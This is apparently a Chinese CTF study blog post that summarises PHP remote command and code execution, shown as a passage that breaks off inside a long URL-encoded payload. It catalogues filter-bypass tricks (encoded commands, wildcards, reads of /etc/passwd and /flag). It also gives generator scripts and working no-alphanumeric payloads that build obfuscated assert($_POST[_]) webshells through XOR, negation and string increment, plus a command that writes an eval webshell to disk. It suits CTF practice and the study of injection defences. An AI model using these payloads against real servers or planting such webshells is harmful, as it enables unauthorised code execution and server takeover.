既远程代码/命令执行，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。

命令执行：直接执行我们输入的恶意命令

代码执行：直接执行我们所输入的恶意代码

# 漏洞成因

命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。

**定义：**当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。

**永远不要相信用户的输入！**

# 漏洞危害

继承Web服务程序的权限去执行系统命令或读写文件
反弹shell
控制整个网站甚至控制服务器
进一步内网渗透

# 常见函数

## 命令执行

```
system()  输出并返回最后一行shell结果
exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面
shell_exec()  通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回
passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上（替换system）
```

## 代码执行

```
eval()函数:用来执行一个字符串表达式，并返回表达式的值
assert()函数:在php语言中是用来判断一个表达式是否成立,返回true or false,但是字符串参数会被执行
```

# 利用技巧

我们需要注意，当我们正常输入的时候，在大多数情况下是不会触发这一漏洞的，我们需要一些小tips。

常见技巧：

```
一、常见管道符：
‘|’ 直接执行后面的语句
‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
‘&’ 前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令
Linux:
Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同
二、空格绕过(空格被过滤)：
<  --  重定向，如cat<flag.php
<>      --   重定向，如cat<>flag.php
%09  --  需要php环境，如cat%09flag.php
${IFS}  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php
$IFS$9  --  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php
三、黑名单绕过
1、拼接
a=c;b=at;c=flag;$a$b $c
a=c;b=at;c=heb;d=ic;ab{c}{d}
2、base64编码
echo MTIzCg==|base64 -d 其将会打印123
echo "Y2F0IC9mbGFn"|base64-d|bash ==>cat /flag
echo "Y2F0IC9mbGFn"|base64 -d|sh ==>cat /flag
3、hex编码
echo "636174202f666c6167" | xxd -r -p|bash ==>cat /flag
4、单引号、双引号,反单引号绕过
ca''t flag 或ca""t flag
ca''t te""st.php
c``a``t /etc/passwd
5、反斜杠绕过
ca\t fl\ag
cat te\st.php
6、绕过ip中的句点
网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。
可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。
在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP
7、利用oct编码（八进制）绕过
$(printf "\154\163")  //ls命令
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?>
${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
在线转换网站:https://photo333.com/text-to-octal-zh.php
8、'/'被过滤绕过
可利用';'拼接命令绕过
cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd (也可以利用第七步的八进制绕过)
9、通配符绕过
列如cat /passwd：
??? /e??/?a????
cat /e*/pa*
10、利用未初始化变量$u绕过
cat$u /etc/passwd
cat /etc$u/passwd
11、glob通配符
cat t[a-z]st
cat t{a,b,c,d,e,f}st
12、利用PATH绕过
可以通过截断和拼接来得到我们想要的来getshell
${PATH:5:1} //l
${PATH:2:1} //s
${PATH:5:1}${PATH:2:1} //拼接后是ls,执行命令
${PATH:5:1}s //拼接后是ls,执行命令
四、绕过长度限制
1，通过>来创建文件
>flag.txt
2，通过>将命令结果存入文件中
echo "hello hacker" > flag.txt
3，>>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容
echo "hello hacker" >> flag.txt
4、Linux中命令换行
在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。
比如：cat flag
ca\
t\
 fla\
g.txt
将命令一条一条输入一个文本中再执行:
root@kali:~# echo "ca\\">cmd
root@kali:~# echo "t\\">>cmd
root@kali:~# echo " fl\\">>cmd
root@kali:~# echo "ag">>cmd
root@kali:~# cat cmd
ca\
t\
 fl\
ag
root@kali:~# sh cmd
this is your flag
五、各种读文件命令
cat--由第一行开始显示内容，并将所有内容输出
tac--从最后一行倒序显示内容，并将所有内容输出
more-- 根据窗口大小，一页一页的现实文件内容
less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head-- 只显示头几行
tail --只显示最后几行
nl --类似于cat -n，显示时输出行号
tailf-- 类似于tail -f
vim --使用vim工具打开文本
vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出
```

上面介绍的这些方法可以解决大部分ctf题目，但是我们会经常遇到更加严苛的过滤，我们就要介绍接下来的一些题目类型和解决方法

# 无数字字母rce

## 源码

我们以一道经典的题目为例:

[极客大挑战 2019]RCE ME

题目代码:

```
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

## 取反绕过

php7

脚本:

```
<?php
//在命令行中运行

/*author yu22x*/

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

脚本使用的时候注意有些()不可以一起转进去，我们先来测试一下

[![image-20221121200544538](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200544538.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121200544538.png)

```
http://127.0.0.1/index.php?code=(~%8f%97%8f%96%91%99%90)(); //我们不需要参数只是测试，把后面的取反符号去掉即可
```

[![image-20221121191347692](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121191347692.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121191347692.png)

我们现在来构造可以执行命令的字符串

```
http://480abdfe-af61-4f9a-bfdf-2e0227fda03b.node4.buuoj.cn:81/?code=(~%8c%86%8c%8b%9a%92)(~%93%8c); //system('ls')
```

按理说没问题的哦，我本地是可以的，不过在buu没有执行成功，不过问题不大，还有很多种方法

这题可以通过:

```
assert(eval($_POST[sakura]))
```

还是利用取反构造

```
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%9E%94%8A%8D%9E%A2%D6);
```

[![image-20221121200843416](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200843416.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121200843416.png)

这里尝试执行命令，同样没反应，那么这题应该是没有回显的，但是我们可以使用蚁剑去连接!

[![image-20221121194931677](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121194931677.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121194931677.png)

这题到这里并没有结束，不过后面并不是我们需要关注的重点，我们就先忽略吧！

## 异或绕过

php7

由于buu的题目无回显，我们直接把源码搭建在本地进行测试:

给出两个脚本:

yihuo.php

```
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }
  
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)^urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

yihuo.py

```
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("xor_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"^\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

php运行后生成一个txt文档，包含所有可见字符的异或构造结果。
接着运行python脚本即可。
运行结果

[![image-20221121201209130](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201209130.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121201209130.png)

```
("%0b%08%0b%09%0e%06%0f"^"%7b%60%7b%60%60%60%60")();  //phpinfo()
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%08%08%0f%01%0d%09"^"%7f%60%60%60%60%60"); //system(whoami)
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");  //system(ls)
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%03%01%08%00%00%06%0c%01%07"^"%60%60%7c%20%2f%60%60%60%60"); //system(cat /flag)
```

[![image-20221121201250221](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201250221.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121201250221.png)

## 二进制或绕过

php7

原理是一样的，只需要在上面的脚本上稍加改动即可

or.php

```
<?php

/* author yu22x */

$myfile = fopen("or_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }
  
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

or.py

```
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("or_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

[![image-20221121203834452](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121203834452.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121203834452.png)

```
("%10%08%10%09%0e%06%0f"|"%60%60%60%60%60%60%60")();  //phpinfo()
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%17%08%0f%01%0d%09"|"%60%60%60%60%60%60");  //system(whoami)
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13"|"%60%60");   //system(ls)
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%00%06%0c%01%07"|"%60%60%60%20%2f%60%60%60%60"); //cat /flag
```

[![image-20221121204056924](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121204056924.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121204056924.png)

## 上传临时文件

`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。

用`. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用`.`来执行它了吗？

这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。

第二个难题接踵而至，执行`. /tmp/phpXXXXXX`，也是有字母的。此时就可以用到Linux下的glob通配符：

- `*`可以代替0个及以上任意字符
- `?`可以代表1个任意字符

那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`。

但我们尝试执行`. /???/?????????`，却得到如下错误：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png)

这是因为，能够匹配上`/???/?????????`这个通配符的文件有很多，我们可以列出来：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png)

可见，我们要执行的`/tmp/phpcjggLC`排在倒数第二位。然而，在执行第一个匹配上的文件（即`/bin/run-parts`）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。

思路又陷入了僵局，虽然方向没错。

**深入理解glob通配符**

大部分同学对于通配符，可能知道的都只有`*`和`?`。但实际上，阅读Linux的文档（ http://man7.org/linux/man-pages/man7/glob.7.html ），可以学到更多有趣的知识点。

其中，glob支持用`[^x]`的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉`/bin/run-parts`：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png)

排除了第4个字符是`-`的文件，同样我们可以排除包含`.`的文件：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png)

现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。

继续阅读glob的帮助，我发现另一个有趣的用法：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png)

就跟正则表达式类似，glob支持利用`[0-9]`来表示一个范围。

我们再来看看之前列出可能干扰我们的文件：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png)

所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。

翻开ascii码表，可见大写字母位于`@`与`[`之间：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png)

那么，我们可以利用`[@-[]`来表示大写字母：

[![image.png](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png)

显然这一招是管用的。

当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。

最后，我传入的code为`?><?=`. /???/????????[@-[]`;?>`，发送数据包如下：

[![image-20221121212607216](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121212607216.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121212607216.png)

可写一个脚本:

```
#coding:utf-8
#author yu22x
import requests
url="http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
```

## 构造无数字字母webshell

环境:php5

php5中assert是一个函数，我们可以通过`$f='assert';$f(...);`这样的方法来动态执行任意代码。

但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。

下文为了方便起见，使用PHP5作为环境

### 异或webshell

这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。

得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

传入代码:

```
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

执行结果如下：

[![image-20221121214114436](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214114436.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121214114436.png)

### 取反webshell

用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`"\x8c"`，其取反即为字母`s`：

[![image-20221121214447649](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214447649.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121214447649.png)

可构造出webshell

```
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;

$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});

$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
```

直接传入:

```
$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);
```

使用时候进行下url编码

```
%24__%3d('%3e'%3e'%3c')%2b('%3e'%3e'%3c')%3b%24_%3d%24__%2f%24__%3b%24____%3d''%3b%24___%3d%22%e7%9e%b0%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9a%84%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%8d%8a%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%a7%8b%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24_____%3d'_'%3b%24___%3d%22%e4%bf%af%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9e%b0%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e6%ac%a1%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e7%ab%99%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24_%3d%24%24_____%3b%24____(%24_%5b%24__%5d)%3b
```

这个答案还利用了PHP的弱类型特性。因为要获取`'和'{2}`，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故`true+true==2`，也就是`('>'>'<')+('>'>'<')==2`。

[![image-20221121220150735](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121220150735.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121220150735.png)

### 自增webshell

7.0.12以上版本不可使用

那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。

这就得借助PHP的一个小技巧，先看文档： http://php.net/manual/zh/language.operators.increment.php

[![14872693882387.jpg](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg)

也就是说，`'a'++ => 'b'`，`'b'++ => 'c'`… 所以，我们只要能拿到一个变量，其值为`a`，通过自增操作即可获得a-z中所有字符。

那么，如何拿到一个值为字符串’a’的变量呢？

巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。

在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`：

[![14872697183159.jpg](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg)

再取这个字符串的第一个字母，就可以获得’A’了。

利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是`ASSERT($_POST[_])`，无需获取小写a）：

```
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

可直接传入

```
//测试发现7.0.12以上版本不可使用
//使用时需要url编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
url编码后再使用
%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b'!'%3d%3d'%40'%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d'_'%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%